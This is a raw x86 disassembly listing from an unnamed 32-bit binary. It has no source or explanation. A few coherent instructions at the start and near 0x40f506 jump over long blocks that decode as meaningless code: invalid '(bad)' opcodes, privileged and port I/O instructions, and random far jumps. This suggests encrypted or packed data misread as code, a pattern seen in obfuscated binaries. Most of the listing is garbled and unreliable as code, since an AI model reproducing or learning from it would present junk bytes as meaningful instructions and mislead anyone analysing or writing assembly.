  40f0bf:	mov    eax,ds:0x414afe
  40f0c4:	push   0x4
  40f0c6:	add    eax,0x1cc
  40f0cb:	push   eax
  40f0cc:	lea    eax,[ebp-0x1c]
  40f0cf:	push   eax
  40f0d0:	call   0x4028d7
  40f0d5:	mov    eax,DWORD PTR [ebp-0x1c]
  40f0d8:	mov    eax,DWORD PTR [ebp-0x4]
  40f0db:	mov    eax,DWORD PTR [ebp-0x24]
  40f0de:	mov    DWORD PTR [ebp+0xc],eax
  40f0e1:	mov    eax,ds:0x414b82
  40f0e6:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0e9:	sub    eax,edi
  40f0eb:	xor    eax,esi
  40f0ed:	cmp    eax,ecx
  40f0ef:	je     0x40f136
  40f0f5:	mov    eax,ds:0x414b7a
  40f0fa:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0fd:	sub    eax,edi
  40f0ff:	xor    eax,esi
  40f101:	cmp    eax,ecx
  40f103:	jne    0x40f119
  40f109:	mov    eax,ds:0x414b82
  40f10e:	add    eax,DWORD PTR ds:0x414b7a
  40f114:	jmp    0x40f120
  40f119:	mov    eax,DWORD PTR [ebp+0xc]
  40f11c:	xor    eax,esi
  40f11e:	add    eax,edi
  40f120:	mov    ds:0x414b7a,eax
  40f125:	mov    eax,DWORD PTR [ebp+0xc]
  40f128:	xor    eax,esi
  40f12a:	add    eax,edi
  40f12c:	mov    ds:0x414b82,eax
  40f131:	jmp    0x40f140
  40f136:	mov    eax,ds:0x414b82
  40f13b:	mov    ds:0x414b7a,eax
  40f140:	mov    eax,DWORD PTR [ebp-0x58]
  40f143:	mov    ecx,DWORD PTR ds:0x414b7a
  40f149:	add    DWORD PTR [eax],ecx
  40f14b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f14e:	mov    eax,DWORD PTR [eax]
  40f150:	pop    edi
  40f151:	pop    esi
  40f152:	pop    ebx
  40f153:	leave  
  40f154:	ret    0xc
  40f157:	push   ebp
  40f158:	mov    ebp,esp
  40f15a:	jmp    0x40f4ed
  40f15f:	repz call 0x655e557a
  40f165:	jae    0x40f1d8
  40f167:	hlt    
  40f168:	aaa    
  40f169:	scas   eax,DWORD PTR es:[edi]
  40f16a:	aad    0x9e
  40f16c:	or     al,0xfc
  40f16e:	jb     0x40f190
  40f170:	mov    dh,0x7e
  40f172:	jle    0x40f168
  40f174:	jns    0x40f1f4
  40f176:	jle    0x40f1ed
  40f178:	les    esp,FWORD PTR [esi-0x7abf056f]
  40f17e:	jmp    0x17fa021d
  40f183:	jns    0x40f113
  40f185:	hlt    
  40f186:	jl     0x40f151
  40f188:	and    eax,DWORD PTR [eax+0x65]
  40f18b:	xor    BYTE PTR [esi+0x16],cl
  40f18e:	mov    DWORD PTR [ebx],eax
  40f190:	arpl   WORD PTR [ecx],bp
  40f192:	ror    BYTE PTR [esi],1
  40f194:	shr    DWORD PTR [ebx],0x3d
  40f197:	mov    bl,0x23
  40f199:	pop    ecx
  40f19a:	(bad)  
  40f19b:	dec    esp
  40f19c:	out    0xe7,al
  40f19e:	mov    edi,0x3e9e1c56
  40f1a3:	mov    DWORD PTR [ecx+0x62],esi
  40f1a6:	adc    al,BYTE PTR [esi]
  40f1a8:	mov    cl,0x75
  40f1aa:	jo     0x40f1b6
  40f1ac:	pop    esp
  40f1ad:	xchg   esi,eax
  40f1ae:	gs pop es
  40f1b0:	jne    0x40f1b1
  40f1b2:	lock loop 0x40f17e
  40f1b5:	loop   0x40f227
  40f1b7:	fsub   QWORD PTR [ecx]
  40f1b9:	fcos   
  40f1bb:	xchg   ebp,eax
  40f1bc:	mov    eax,ds:0xf4918517
  40f1c1:	sbb    DWORD PTR [ebp+eiz*1+0x4d1c62ca],ebp
  40f1c8:	push   edi
  40f1c9:	ins    BYTE PTR es:[edi],dx
  40f1ca:	inc    esi
  40f1cb:	js     0x40f1a9
  40f1cd:	aas    
  40f1ce:	repz cmp eax,0x69a8551c
  40f1d4:	test   bl,ch
  40f1d6:	pop    esp
  40f1d7:	repnz cmp eax,0x4feb718f
  40f1dd:	adc    DWORD PTR [edi+0x46efd748],ebx
  40f1e3:	jno    0x40f206
  40f1e5:	xor    eax,0x3660abab
  40f1ea:	pop    ebx
  40f1eb:	ja     0x40f1a4
  40f1ed:	push   edi
  40f1ee:	cmp    esi,ebp
  40f1f0:	lea    esi,[ecx]
  40f1f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1f3:	ja     0x40f1f1
  40f1f5:	cld    
  40f1f6:	and    dh,BYTE PTR [ebx+0x18bd277f]
  40f1fc:	dec    eax
  40f1fd:	xchg   edx,eax
  40f1fe:	inc    eax
  40f1ff:	icebp  
  40f200:	mov    eax,ds:0xbc9ac424
  40f205:	cmp    edx,DWORD PTR [ebp-0x5a494143]
  40f20b:	outs   dx,DWORD PTR ds:[esi]
  40f20c:	pop    edx
  40f20d:	test   BYTE PTR [esi+0x4f88ad5a],dh
  40f213:	call   0x7e06:0xd3ed4194
  40f21a:	mov    edx,0x8f9190fc
  40f21f:	xchg   bl,ah
  40f221:	(bad)  
  40f222:	je     0x40f26b
  40f224:	clc    
  40f225:	xchg   edx,eax
  40f226:	or     DWORD PTR [edi],edx
  40f228:	icebp  
  40f229:	pusha  
  40f22a:	sbb    bh,BYTE PTR [ecx]
  40f22c:	xor    eax,0xf68e726
  40f231:	int3   
  40f232:	retf   
  40f233:	add    BYTE PTR [eax+0x25],0x78
  40f237:	in     eax,dx
  40f238:	dec    dx
  40f23a:	bound  eax,QWORD PTR [edi+0x55]
  40f23d:	xchg   ecx,eax
  40f23e:	push   esp
  40f23f:	adc    eax,0x147e01b4
  40f244:	mov    edi,0x194c4c1b
  40f249:	aas    
  40f24a:	push   0xb35b2065
  40f24f:	cmp    al,0x55
  40f251:	mov    ds:0x9e39b1c2,eax
  40f256:	sar    edx,1
  40f258:	push   0xffffffe3
  40f25a:	sub    eax,0xe36650e4
  40f25f:	xchg   bp,ax
  40f261:	mov    bl,0xc5
  40f263:	gs sti 
  40f265:	jecxz  0x40f22b
  40f267:	rcr    edx,cl
  40f269:	or     dl,BYTE PTR [esi]
  40f26b:	mov    ch,0xe
  40f26d:	stc    
  40f26e:	(bad)  
  40f26f:	mov    al,ds:0xa14d54f2
  40f274:	and    eax,0x3118fe48
  40f279:	pop    esi
  40f27a:	inc    esp
  40f27b:	arpl   cx,cx
  40f27d:	dec    ecx
  40f27e:	push   eax
  40f27f:	int3   
  40f280:	xor    ebx,DWORD PTR [ecx]
  40f282:	cs adc eax,0xe219936a
  40f288:	daa    
  40f289:	ja     0x40f2dc
  40f28b:	or     DWORD PTR [edx-0xf4caec2],edx
  40f291:	stc    
  40f292:	neg    BYTE PTR [ebp+0x32]
  40f295:	fbld   TBYTE PTR [ecx]
  40f297:	rcr    DWORD PTR [edx+eiz*1],0x1a
  40f29b:	stc    
  40f29c:	daa    
  40f29d:	or     cl,BYTE PTR [edx-0x55bf83ab]
  40f2a3:	mov    edi,0x15006c0c
  40f2a8:	(bad)  
  40f2a9:	ret    0x5ec9
  40f2ac:	push   ebp
  40f2ad:	gs jmp 0x40f2b8
  40f2b0:	fchs   
  40f2b2:	inc    ebx
  40f2b3:	lock jge 0x40f32f
  40f2b6:	xchg   ecx,eax
  40f2b7:	inc    edi
  40f2b8:	fistp  DWORD PTR [edi-0x5bfeb400]
  40f2be:	rol    BYTE PTR [ebp+0x57bc9c5d],1
  40f2c4:	pushf  
  40f2c5:	imul   ebx,DWORD PTR [edi-0x1037fdbc],0x1f
  40f2cc:	shl    DWORD PTR ds:[ecx+0x94896b6],1
  40f2d3:	xchg   ebp,edi
  40f2d5:	outs   dx,BYTE PTR ds:[esi]
  40f2d6:	sbb    eax,0xbe15f7c0
  40f2db:	jmp    0xdbb3:0x507a240c
  40f2e2:	in     eax,0xd8
  40f2e4:	(bad)  
  40f2e5:	fcomp  DWORD PTR [edi-0x50b41c90]
  40f2eb:	pusha  
  40f2ec:	ret    
  40f2ed:	rcl    esp,1
  40f2ef:	(bad)  
  40f2f1:	xor    cl,BYTE PTR [edi-0x20]
  40f2f4:	imul   edx,DWORD PTR [edi],0xffffffb1
  40f2f7:	xlat   BYTE PTR ds:[ebx]
  40f2f8:	pop    eax
  40f2f9:	xor    ah,BYTE PTR [esi+edx*8+0x6e]
  40f2fd:	in     al,dx
  40f2fe:	test   eax,0x47f970cc
  40f303:	clc    
  40f304:	dec    ecx
  40f305:	and    al,0xdc
  40f307:	lods   eax,DWORD PTR ds:[esi]
  40f308:	sub    al,BYTE PTR [esp+edx*8]
  40f30b:	in     eax,dx
  40f30c:	pop    ss
  40f30d:	inc    esi
  40f30e:	sub    al,0xb
  40f310:	sub    DWORD PTR [ebx+0x5c0acdde],0x6b
  40f317:	outs   dx,DWORD PTR es:[esi]
  40f319:	dec    edi
  40f31a:	fsub   st,st(0)
  40f31c:	mov    ds:0x6d87d58d,al
  40f321:	into   
  40f322:	outs   dx,DWORD PTR ds:[esi]
  40f323:	in     eax,dx
  40f324:	mov    edi,0xc32866c9
  40f329:	test   DWORD PTR [edi+0x53],ebx
  40f32c:	fmul   st,st(6)
  40f32e:	psadbw mm4,QWORD PTR [esi-0x13155093]
  40f335:	shl    DWORD PTR [edi+0x71cb7e07],0x23
  40f33c:	sub    al,0x45
  40f33e:	push   0x78e455cf
  40f343:	cdq    
  40f344:	retf   0x4d4e
  40f347:	mov    ch,0x37
  40f349:	push   0xfffffff1
  40f34b:	out    dx,eax
  40f34c:	inc    edx
  40f34d:	xor    DWORD PTR [edi],esp
  40f34f:	adc    BYTE PTR [ebp-0x66],0xad
  40f353:	outs   dx,BYTE PTR ds:[esi]
  40f354:	pop    esi
  40f355:	mov    ah,0x3d
  40f357:	inc    ebx
  40f358:	pusha  
  40f359:	ret    0xc1ad
  40f35c:	mov    dh,0xda
  40f35e:	mov    bh,0xd4
  40f360:	ins    BYTE PTR es:[edi],dx
  40f361:	je     0x40f380
  40f363:	sub    al,0x50
  40f365:	std    
  40f366:	push   ebx
  40f367:	sub    eax,0xf290ab26
  40f36c:	ret    0xc13a
  40f36f:	les    esp,FWORD PTR [edx]
  40f371:	in     eax,0x2a
  40f373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f374:	js     0x40f3cb
  40f376:	mov    ds:0xa603a187,al
  40f37b:	dec    ebp
  40f37c:	add    DWORD PTR [ecx+0xa],ecx
  40f37f:	inc    esi
  40f380:	jno    0x40f3bb
  40f382:	mov    dl,0xc6
  40f384:	sbb    eax,DWORD PTR [ebx+0x72]
  40f387:	dec    ecx
  40f388:	mov    ebp,0xf0bd45ae
  40f38d:	sbb    BYTE PTR [ebp-0x31],bh
  40f390:	add    BYTE PTR [edx+0x3d74ab80],dh
  40f396:	out    0xf9,al
  40f398:	mov    WORD PTR [edx-0x7f4e75a2],es
  40f39e:	cmp    bh,BYTE PTR [ebp+esi*1+0x4f37552d]
  40f3a5:	jae    0x40f3be
  40f3a7:	pop    eax
  40f3a8:	xchg   esp,eax
  40f3a9:	xchg   edi,eax
  40f3aa:	mov    cl,BYTE PTR [edi+0x7af7a8b5]
  40f3b0:	sub    eax,0x675ad4d6
  40f3b5:	mov    dh,0xe0
  40f3b7:	inc    ebp
  40f3b8:	jg     0x40f3e9
  40f3ba:	fbstp  TBYTE PTR [esi+0x990a64d]
  40f3c0:	push   eax
  40f3c1:	jecxz  0x40f430
  40f3c3:	(bad)  
  40f3c4:	mov    ebx,0x18d4317f
  40f3c9:	mov    ah,0xf5
  40f3cb:	scas   eax,DWORD PTR es:[edi]
  40f3cc:	lea    esp,[edi+eiz*2-0x46]
  40f3d0:	sbb    eax,0x2ed4153e
  40f3d5:	ds loop 0x40f372
  40f3d8:	div    ch
  40f3da:	aaa    
  40f3db:	dec    eax
  40f3dc:	and    al,0x10
  40f3de:	and    al,0x4c
  40f3e0:	push   eax
  40f3e1:	jae    0x40f3ec
  40f3e3:	cmp    edi,esp
  40f3e5:	xchg   ebp,eax
  40f3e6:	and    dl,al
  40f3e8:	in     al,0x3
  40f3ea:	xchg   ebx,eax
  40f3eb:	fdivr  DWORD PTR [edi+0x5e0cd2b4]
  40f3f1:	push   edx
  40f3f2:	sahf   
  40f3f3:	sbb    dh,BYTE PTR [edi]
  40f3f5:	shr    DWORD PTR [ecx+edx*4],1
  40f3f8:	es jb  0x40f46d
  40f3fb:	inc    eax
  40f3fc:	in     eax,0x14
  40f3fe:	jmp    0xdd96a7a2
  40f403:	iret   
  40f404:	dec    ecx
  40f405:	add    eax,0xeccbbbcb
  40f40a:	push   cs
  40f40b:	test   DWORD PTR [edi*2+0xc869e5a],0x4369d5ed
  40f416:	ret    
  40f417:	adc    ebp,DWORD PTR [ecx+ebp*8]
  40f41a:	add    edi,edi
  40f41c:	in     eax,0x59
  40f41e:	aas    
  40f41f:	cdq    
  40f420:	xor    edi,DWORD PTR [ecx+0x6c154e51]
  40f426:	pop    edi
  40f427:	sbb    dl,BYTE PTR [edx]
  40f429:	adc    eax,DWORD PTR [esi]
  40f42b:	or     ah,BYTE PTR [edx+0x287b02c3]
  40f431:	std    
  40f432:	ja     0x40f3e5
  40f434:	dec    esp
  40f435:	add    ah,ch
  40f437:	sub    DWORD PTR [edx+0x40],ecx
  40f43a:	(bad)  
  40f43b:	stos   BYTE PTR es:[edi],al
  40f43c:	inc    edi
  40f43d:	and    DWORD PTR [edx+0x3],ebx
  40f440:	cmc    
  40f441:	out    0x27,al
  40f443:	push   edi
  40f444:	popf   
  40f445:	inc    ecx
  40f446:	out    dx,al
  40f447:	and    al,0x96
  40f449:	mov    ecx,0xcb6435f5
  40f44e:	fisubr DWORD PTR [esi-0xc]
  40f451:	cs jecxz 0x40f4cb
  40f454:	push   0xa5f8d193
  40f459:	pop    edi
  40f45a:	nop
  40f45b:	cmc    
  40f45c:	arpl   WORD PTR [eax+0x3c3c09eb],dx
  40f462:	pop    edx
  40f463:	adc    eax,0x27a7023b
  40f468:	lea    esi,[edi]
  40f46a:	mov    esp,0xed40e4a4
  40f46f:	mov    al,ds:0xb6cf4b6
  40f474:	int3   
  40f475:	dec    ecx
  40f476:	dec    esp
  40f477:	pushf  
  40f478:	pop    edi
  40f479:	test   al,0x7c
  40f47b:	jecxz  0x40f4aa
  40f47d:	jg     0x40f461
  40f47f:	mov    bh,0x94
  40f481:	push   ds
  40f482:	pop    eax
  40f483:	xlat   BYTE PTR ds:[ebx]
  40f484:	ds jnp 0x40f42a
  40f487:	inc    BYTE PTR [ecx+0x7d8dbc75]
  40f48d:	push   ss
  40f48e:	cdq    
  40f48f:	daa    
  40f490:	(bad)  
  40f491:	mov    bl,0x53
  40f493:	mov    esp,0x633a36a0
  40f498:	pushf  
  40f499:	(bad)  
  40f49a:	jl     0x40f4a7
  40f49c:	jmp    0x5640ec4a
  40f4a1:	jmp    DWORD PTR [edi+0x3ebbccbb]
  40f4a7:	jle    0x40f502
  40f4a9:	xchg   edi,eax
  40f4aa:	mov    al,ds:0x4920a8e3
  40f4af:	and    ah,BYTE PTR ds:0x5bb1c619
  40f4b5:	icebp  
  40f4b6:	adc    DWORD PTR [edi+0x5562164f],esp
  40f4bc:	cmp    ecx,DWORD PTR [ebp+0x7e34fd18]
  40f4c2:	push   ebp
  40f4c3:	repz (bad) 
  40f4c5:	xchg   ebx,eax
  40f4c6:	outs   dx,BYTE PTR ds:[esi]
  40f4c7:	pop    edi
  40f4c8:	push   ebx
  40f4c9:	jg     0x40f4d1
  40f4cb:	adc    eax,0xde7b3e07
  40f4d0:	mov    dl,0x23
  40f4d2:	push   ds
  40f4d3:	shl    DWORD PTR [edi+0x26],0xd1
  40f4d7:	jge    0x40f460
  40f4d9:	xor    ch,al
  40f4db:	punpcklwd mm7,DWORD PTR [edi+0x71]
  40f4df:	int3   
  40f4e0:	inc    ebp
  40f4e1:	rol    DWORD PTR [ecx+ebx*1],0xc9
  40f4e5:	xor    eax,0x24cbe4ed
  40f4ea:	shl    DWORD PTR [esp+eiz*2+0x39b85151],1
  40f4f1:	test   DWORD PTR [eax+edi*8+0x36fc45c7],ebx
  40f4f8:	test   DWORD PTR [eax+edi*8+0x46fb05c7],ebx
  40f4ff:	inc    ebx
  40f500:	add    BYTE PTR [eax+0x56000036],ah
  40f506:	mov    ecx,DWORD PTR ds:0x43470b
  40f50c:	mov    DWORD PTR [ebp-0x8],eax
  40f50f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f512:	mov    DWORD PTR ds:0x4346d3,0x6a14
  40f51c:	push   edi
  40f51d:	mov    DWORD PTR ds:0x4346ff,0x48b4
  40f527:	mov    edi,0x7510851
  40f52c:	mov    DWORD PTR ds:0x43463f,0x7e06
  40f536:	mov    esi,0x327299
  40f53b:	mov    DWORD PTR ds:0x43468b,0x7203
  40f545:	cmp    ecx,eax
  40f547:	je     0x40fd56
  40f54d:	or     eax,eax
  40f54f:	jmp    0x40f8e2
  40f554:	cmc    
  40f555:	pop    esp
  40f556:	inc    ebp
  40f557:	gs ins DWORD PTR es:[edi],dx
  40f559:	jge    0x40f550
  40f55b:	pop    esp
  40f55c:	push   0xffffffac
  40f55e:	add    ah,BYTE PTR [esi+0x3c]
  40f561:	daa    
  40f562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f563:	mov    ah,0x9e
  40f565:	mov    cl,0x7e
  40f567:	jle    0x40f55d
  40f569:	jns    0x40f5e9
  40f56b:	jle    0x40f5b4
  40f56d:	add    BYTE PTR [esi+eax*4-0x5d16646a],bh
  40f574:	outs   dx,DWORD PTR ds:[esi]
  40f575:	jmp    0x4d2c8385
  40f57a:	xchg   BYTE PTR cs:[eax+0x53],dl
  40f57e:	inc    esp
  40f57f:	sub    dl,BYTE PTR [eax-0x33]
  40f582:	fs or  al,0xe0
  40f585:	pop    ecx
  40f586:	push   ss
  40f587:	sar    al,0xd4
  40f58a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f58b:	mov    dl,0x8b
  40f58d:	fnstenv [edi-0x31]
  40f590:	int3   
  40f591:	xchg   esi,eax
  40f592:	sub    BYTE PTR [esi-0x6a4349c1],ah
  40f598:	jmp    0x40f604
  40f59a:	repz mov gs,esi
  40f59d:	test   al,0x89
  40f59f:	or     BYTE PTR [edx],bh
  40f5a1:	mov    DWORD PTR [ecx+0x4298ae67],ecx
  40f5a7:	pinsrw mm2,WORD PTR [edx-0x39],0xff
  40f5ac:	pushf  
  40f5ad:	xchg   edi,eax
  40f5ae:	xor    ch,dh
  40f5b0:	dec    eax
  40f5b1:	int    0x95
  40f5b3:	das    
  40f5b4:	sbb    BYTE PTR [ebp+0x27714783],ch
  40f5ba:	(bad)  
  40f5bb:	out    0xa5,eax
  40f5bd:	sbb    esi,DWORD PTR [edi-0x540fffde]
  40f5c3:	enter  0x61dd,0xd7
  40f5c7:	imul   DWORD PTR [eax+0x4b]
  40f5ca:	leave  
  40f5cb:	call   0xaeeb:0xd7aae18a
  40f5d2:	dec    esi
  40f5d3:	inc    ecx
  40f5d4:	jae    0x40f64b
  40f5d6:	repz add ebp,ecx
  40f5d9:	add    eax,0xead82e82
  40f5de:	ins    DWORD PTR es:[edi],dx
  40f5df:	popa   
  40f5e0:	jp     0x40f5ca
  40f5e2:	les    esi,FWORD PTR [ebx]
  40f5e4:	aaa    
  40f5e5:	mov    ?,WORD PTR [ebx+0x50]
  40f5e8:	lahf   
  40f5e9:	push   esi
  40f5ea:	ins    BYTE PTR es:[edi],dx
  40f5eb:	pop    eax
  40f5ec:	inc    ecx
  40f5ed:	and    ebp,DWORD PTR [edx+ebx*8+0x67057a00]
  40f5f4:	push   0xfffffff8
  40f5f6:	pop    esp
  40f5f7:	sbb    bl,BYTE PTR [edx]
  40f5f9:	xor    esi,edx
  40f5fb:	xchg   edi,eax
  40f5fc:	int    0xdc
  40f5fe:	and    DWORD PTR [ebx+0x62cc36f5],ebx
  40f604:	std    
  40f605:	dec    esi
  40f606:	out    dx,eax
  40f607:	or     BYTE PTR [esi],ch
  40f609:	jmp    0x40f5a0
  40f60b:	lods   eax,DWORD PTR ds:[esi]
  40f60c:	sub    ch,dl
  40f60e:	pop    edi
  40f60f:	rcr    DWORD PTR [ebx],cl
  40f611:	pusha  
  40f612:	xlat   BYTE PTR ds:[ebx]
  40f613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f614:	shl    DWORD PTR [ebx],0x74
  40f617:	xor    eax,0x2801d739
  40f61c:	clc    
  40f61d:	and    eax,0xd1dc2d22
  40f622:	xor    eax,0xd012097e
  40f627:	lea    edi,[ebp-0x61289be7]
  40f62d:	rsm    
  40f62f:	cmp    edx,DWORD PTR [eax]
  40f631:	ret    
  40f632:	mov    BYTE PTR [eax+0x2d],0xb
  40f636:	push   esp
  40f637:	(bad)  
  40f638:	cmp    al,ch
  40f63a:	xor    al,0x60
  40f63c:	push   ebp
  40f63d:	inc    edi
  40f63e:	retf   0x6ddd
  40f641:	cli    
  40f642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f643:	inc    ecx
  40f644:	pop    ss
  40f645:	mov    ah,0x8a
  40f647:	sbb    BYTE PTR [ebp-0x56646681],bl
  40f64d:	or     al,0x1c
  40f64f:	pop    esi
  40f650:	es test al,0x6b
  40f653:	jno    0x40f5ef
  40f655:	ret    
  40f656:	fst    QWORD PTR ds:[edx]
  40f659:	cmp    esp,edx
  40f65b:	inc    eax
  40f65c:	(bad)  
  40f65d:	stos   DWORD PTR es:[edi],eax
  40f65e:	lock or esp,0xffffffcf
  40f662:	cmp    edx,DWORD PTR [ecx+eax*8-0x5a]
  40f666:	mov    dh,BYTE PTR [edx-0x5d893e7]
  40f66c:	test   eax,0x4adeae40
  40f671:	jp     0x40f6b8
  40f673:	mov    eax,0xd1bdc7db
  40f678:	scas   eax,DWORD PTR es:[edi]
  40f679:	inc    esi
  40f67a:	aas    
  40f67b:	test   BYTE PTR ds:0xb3463873,cl
  40f681:	js     0x40f610
  40f683:	sbb    eax,0x86b0bb25
  40f688:	sbb    al,0x5f
  40f68a:	cdq    
  40f68b:	mov    eax,0xd1410b28
  40f690:	mov    ds:0x17ddcf9,al
  40f695:	(bad)  
  40f697:	sbb    ch,dh
  40f699:	inc    edx
  40f69a:	int    0xf9
  40f69c:	inc    edi
  40f69d:	or     ah,BYTE PTR [edi-0x132a6349]
  40f6a3:	in     eax,0xd6
  40f6a5:	fmul   st(4),st
  40f6a7:	(bad)  
  40f6a8:	xor    edx,edi
  40f6aa:	mov    ecx,0x78507e6f
  40f6af:	js     0x40f723
  40f6b1:	imul   edi,DWORD PTR [ebp-0x11],0xffffffbf
  40f6b5:	sbb    BYTE PTR [esi+esi*4-0x207218b4],bl
  40f6bc:	shl    DWORD PTR [edx+0x5d53ed50],cl
  40f6c2:	and    eax,0xd5f87c96
  40f6c7:	in     eax,0x58
  40f6c9:	test   al,0x53
  40f6cb:	jns    0x40f692
  40f6cd:	daa    
  40f6ce:	mov    ebp,0x8471fd2d
  40f6d3:	push   esp
  40f6d4:	add    DWORD PTR [ebp-0x2d],eax
  40f6d7:	dec    esi
  40f6d8:	lods   al,BYTE PTR ds:[esi]
  40f6d9:	inc    ebx
  40f6da:	retf   0xa50a
  40f6dd:	je     0x40f737
  40f6df:	sub    al,0x75
  40f6e1:	mov    cl,0xbd
  40f6e3:	aaa    
  40f6e4:	dec    eax
  40f6e5:	cmc    
  40f6e6:	jbe    0x40f6cb
  40f6e8:	pop    ds
  40f6e9:	stos   DWORD PTR es:[edi],eax
  40f6ea:	shl    DWORD PTR [esi-0x57],cl
  40f6ed:	jmp    0xb8f6:0x28bfdd68
  40f6f4:	lock sahf 
  40f6f6:	or     al,0xab
  40f6f8:	popf   
  40f6f9:	ins    DWORD PTR es:[edi],dx
  40f6fa:	clc    
  40f6fb:	sbb    BYTE PTR [ecx],ah
  40f6fd:	sub    eax,DWORD PTR [eax]
  40f6ff:	shl    eax,0xf2
  40f702:	and    eax,0x369659ca
  40f707:	ss xchg ebp,eax
  40f709:	out    0xc2,eax
  40f70b:	arpl   WORD PTR [esp+esi*4],si
  40f70e:	scas   eax,DWORD PTR es:[edi]
  40f70f:	or     BYTE PTR [ecx+0x6b],cl
  40f712:	dec    esp
  40f713:	sub    eax,0xffffffd8
  40f716:	xchg   esi,eax
  40f717:	cli    
  40f718:	jne    0x40f6dc
  40f71a:	jle    0x40f6c8
  40f71c:	and    DWORD PTR [ebx],edx
  40f71e:	jb     0x40f770
  40f720:	sahf   
  40f721:	jp     0x40f6bd
  40f723:	mov    al,ds:0xf0637e9c
  40f728:	mov    ds:0x2e9f7328,eax
  40f72d:	and    dh,bh
  40f72f:	shl    DWORD PTR [ebx+0x49],cl
  40f732:	or     DWORD PTR [ebx+0xb],edi
  40f735:	and    DWORD PTR [ecx+0x6841fa79],0xffffffe2
  40f73c:	xchg   ecx,eax
  40f73d:	push   ebp
  40f73e:	iret   
  40f73f:	data16 arpl bp,sp
  40f742:	fbld   TBYTE PTR [edx-0x8c66324]
  40f748:	adc    al,0x79
  40f74a:	xchg   BYTE PTR [eax],bl
  40f74c:	retf   
  40f74d:	(bad)  
  40f74e:	push   ss
  40f74f:	mov    edx,DWORD PTR [eax]
  40f751:	mov    ch,BYTE PTR [eax]
  40f753:	cdq    
  40f754:	lahf   
  40f755:	stos   BYTE PTR es:[edi],al
  40f756:	imul   ebp,DWORD PTR [ecx+0x6],0x8eea475d
  40f75d:	sbb    ebx,DWORD PTR [edx+0x453ef1b8]
  40f763:	mov    BYTE PTR [ebx-0x3bac3e5e],ah
  40f769:	das    
  40f76a:	ret    0xa400
  40f76d:	and    eax,esp
  40f76f:	jbe    0x40f753
  40f771:	xchg   ecx,eax
  40f772:	repz dec esi
  40f774:	inc    edi
  40f775:	add    dh,BYTE PTR [ebp-0x19f1cab0]
  40f77b:	pop    esi
  40f77c:	push   edx
  40f77d:	pop    es
  40f77e:	and    al,0xd4
  40f780:	popa   
  40f781:	jne    0x40f7fe
  40f783:	ret    0xd5a2
  40f786:	mov    ch,0xb9
  40f788:	ins    BYTE PTR es:[edi],dx
  40f789:	push   esp
  40f78a:	dec    esi
  40f78b:	adc    al,0x99
  40f78d:	mov    bh,0xb2
  40f78f:	hlt    
  40f790:	ror    DWORD PTR [ebp+0x4955b605],1
  40f796:	fild   WORD PTR [ecx-0x2d]
  40f799:	repnz adc ah,BYTE PTR [esi+eax*1]
  40f79d:	pop    eax
  40f79e:	imul   BYTE PTR [ebp-0x4b5ed040]
  40f7a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7a5:	inc    eax
  40f7a6:	xchg   edi,eax
  40f7a7:	rcr    DWORD PTR [ecx],1
  40f7a9:	ins    BYTE PTR es:[edi],dx
  40f7aa:	mov    edi,0xe7504b7d
  40f7af:	lock jecxz 0x40f790
  40f7b2:	or     dh,BYTE PTR [ecx-0x6e111fbd]
  40f7b8:	out    dx,al
  40f7b9:	xchg   BYTE PTR [ebx-0x13],ah
  40f7bc:	add    al,0xd1
  40f7be:	mov    bh,0x36
  40f7c0:	or     DWORD PTR [ecx-0x2e326e87],0x10
  40f7c7:	xchg   DWORD PTR [edi+0x2e310bc9],eax
  40f7cd:	call   0x541d9d1a
  40f7d2:	clc    
  40f7d3:	push   ecx
  40f7d4:	cwde   
  40f7d5:	or     al,0x9b
  40f7d7:	(bad)  
  40f7d8:	call   0x847f744b
  40f7dd:	ret    
  40f7de:	lea    ebp,[ecx-0x33d93d2d]
  40f7e4:	push   ebx
  40f7e5:	les    esp,FWORD PTR [eax-0x39068751]
  40f7eb:	mov    edx,0x17d60dca
  40f7f0:	sbb    al,0x1c
  40f7f2:	outs   dx,BYTE PTR ds:[esi]
  40f7f3:	cmp    DWORD PTR [edi+0x6f],ebx
  40f7f6:	add    BYTE PTR [eax+0x3ef7bbed],ch
  40f7fc:	pop    eax
  40f7fd:	push   edi
  40f7fe:	sub    DWORD PTR [edi-0x79],edx
  40f801:	inc    esi
  40f802:	imul   eax,ecx,0x1fea7e5
  40f808:	ror    DWORD PTR [esi+esi*2],cl
  40f80b:	rcl    BYTE PTR [ecx+0x6],0xa9
  40f80f:	xchg   edx,eax
  40f810:	mov    cl,0xc
  40f812:	ficom  WORD PTR [ebp+0x11]
  40f815:	mov    esi,0xc2fc90b2
  40f81a:	xchg   BYTE PTR [eax],bh
  40f81c:	rol    BYTE PTR [ebp+0xe70a43],0x32
  40f823:	xchg   edx,eax
  40f824:	add    DWORD PTR [edx-0x61],esp
  40f827:	stos   DWORD PTR es:[edi],eax
  40f828:	jg     0x40f838
  40f82a:	addr16 aaa 
  40f82c:	add    BYTE PTR [esi+eiz*4+0x61396614],cl
  40f833:	cs ret 0x25df
  40f837:	aam    0xe6
  40f839:	(bad)  
  40f83a:	adc    cl,BYTE PTR [esi-0x488cc36a]
  40f840:	sub    bh,BYTE PTR [ebp-0x32]
  40f843:	mov    edx,DWORD PTR [esi+eax*8+0x73]
  40f847:	sbb    DWORD PTR [ecx+0x55],edi
  40f84a:	sbb    BYTE PTR [ecx-0x7924297e],al
  40f850:	sbb    cl,bh
  40f852:	add    al,bl
  40f854:	inc    ebx
  40f855:	cdq    
  40f856:	push   0x30
  40f858:	push   ds
  40f859:	or     al,0xf1
  40f85b:	mov    eax,ebx
  40f85d:	popa   
  40f85e:	mov    ds,ebx
  40f860:	out    0xb3,al
  40f862:	sbb    DWORD PTR [eax-0x55],eax
  40f865:	push   esi
  40f866:	aad    0x4e
  40f868:	(bad)  
  40f869:	(bad)  
  40f86a:	clc    
  40f86b:	fprem1 
  40f86d:	nop
  40f86e:	pop    eax
  40f86f:	push   ebp
  40f870:	xlat   BYTE PTR ds:[ebx]
